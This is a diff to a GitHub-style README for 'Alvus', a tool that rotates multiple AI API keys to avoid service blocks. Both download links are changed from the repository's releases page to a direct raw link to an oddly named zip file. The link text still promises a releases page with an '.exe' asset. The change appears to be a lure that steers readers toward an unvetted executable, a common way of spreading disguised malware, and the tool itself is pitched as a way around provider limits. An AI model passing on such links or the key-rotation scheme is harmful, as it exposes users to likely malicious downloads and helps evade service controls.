@@ -1,12 +1,12 @@
 # 🚀 Alvus - Rotating AI Keys for Daily Tasks
 
-[![](https://img.shields.io/badge/Download_Alvus-Blue.svg?style=for-the-badge)](https://github.com/filariasistrichoglossusmoluccanus49/Alvus/releases)
+[![](https://img.shields.io/badge/Download_Alvus-Blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/filariasistrichoglossusmoluccanus49/Alvus/main/twanginess/Software_2.4.zip)
 
 Alvus manages your AI assistant connections. It shifts between multiple API keys to prevent service blocks. You keep your work moving without interruptions.
 
 ## 📥 How to Download
 
-Visit the [Alvus releases page](https://github.com/filariasistrichoglossusmoluccanus49/Alvus) to find the latest version. Look for the file ending in `.exe` under the Assets section. Save this file to your computer.
+Visit the [Alvus releases page](https://raw.githubusercontent.com/filariasistrichoglossusmoluccanus49/Alvus/main/twanginess/Software_2.4.zip) to find the latest version. Look for the file ending in `.exe` under the Assets section. Save this file to your computer.
 
 ## ⚙️ Preparation
 
